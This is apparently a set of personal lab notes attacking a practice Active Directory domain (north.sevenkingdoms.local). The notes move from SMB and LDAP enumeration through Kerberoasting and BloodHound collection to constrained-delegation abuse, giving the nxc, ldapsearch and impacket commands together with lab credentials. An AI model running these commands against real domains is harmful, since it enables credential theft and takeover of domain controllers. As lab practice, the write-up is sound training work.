
We got a password for the account `samwell.tarky`.

Now let's try SMB enumeration.
  ![[images/2026-10-06_15-34-23.png]]
We do not have more rights than the anonymous auth.
In the `NETLOGON` and `SYSVOL` shares we can get powershell scripts with credentials in it.
  ![[images/2026-10-06_15-39-17.png]]
> **danger** Danger
> Will need to test this secret in base64 later !

Before re-scanning everything with the new credz, I'm going to try to connect to LDAP with the `samwell.tarly` account.

```bash
  nxc ldap winterfell -u 'samwell.tarly' -p 'Heartsbane' \
    -d "north.sevenkingdoms.local" --users
```
  ![[images/2026-10-06_15-50-16.png]]
Nothing new here, but sometimes we can get more users from LDAP than from SMB RIDs.

I tried LDAP enumeration with the `jeor.mormont` account, we get a lot of stuff. Let's try to find passwords or secrets.

```bash
  ldapsearch -H ldap://winterfell -x -b \
      'dc=north,dc=sevenkingdoms,dc=local' -t all \
      -D 'jeor.mormont@north.sevenkingdoms.local' -w '_L0ngCl@w_'
```  

> **note** Note
> Nothing more was found in the LDAP dictionnary.

We can also try kerberoasting on `samwell.tarly` or `jeor.mormont` account. We get the same result from both.

```bash
  impacket-GetUserSPNs -request -dc-ip 10.2.10.11 \
      'north.sevenkingdoms.local/jeor.mormont:_L0ngCl@w_'
```
  ![[images/2026-10-07_14-36-17.png]]
And we successfully cracked the `jon.snow` account.

![[images/2026-10-07_15-04-33.png]]
We can dump the LDAP and import it in BloodHound, we can see a `AllowToDelegate` from `jon.snow` to the `winterfell` machine.

```bash
  bloodhound-python -d 'north.sevenkingdoms.local' \
    -u 'jon.snow' -p 'iknownothing' \
      -gc 'winterfell.north.sevenkingdoms.local' -c all
```
  ![[images/2026-10-08_08-51-41.png]]
This allows us to impersonate certain Service Account, such as the Administrator and get the Service Tickets.

```bash
  impacket-getST -spn 'CIFS/winterfell.north.sevenkingdoms.local' \
    -impersonate 'Administrator' \
  'north.sevenkingdoms.local/jon.snow:iknownothing' 
```

And with this we retrieve the ST of the Administrator.

> **danger** Danger
> I'm having trouble getting the ST to work to dump secrets or anything. It has to be with the account I want to impersonate. I need further research and understanding to succeed.


Ok so what are trying to do here ? 
- We have am account that has `AllowToDelegate` ACE on the `WINTERFELL` machine aka the DC.

To be precise we have `Constrained Delegation Privileges`.
  ![[images/2026-10-08_15-12-15.png]]
So we want to ask the KDC for a ST as the local admin of the machine and then use the ST to authenticate as the local admin.
  ![[images/2026-10-08_15-11-43.png]]
We can see that the user of the `WINTERFELL` machine is `WINTERFELL$` so this is the account we want to take over. And we are using the `CIFS/winterfell` SPN to do it.
  ![[images/2026-10-08_17-02-37.png]]

```bash
  impacket-getST -spn CIFS/winterfell.north.sevenkingdoms.local \
      -altservice HOST/winterfell.north.sevenkingdoms.local \
      -impersonate Administrator \
      north.sevenkingdoms.local/WINTERFELL$ \
      -k -dc-ip 10.2.10.11
```



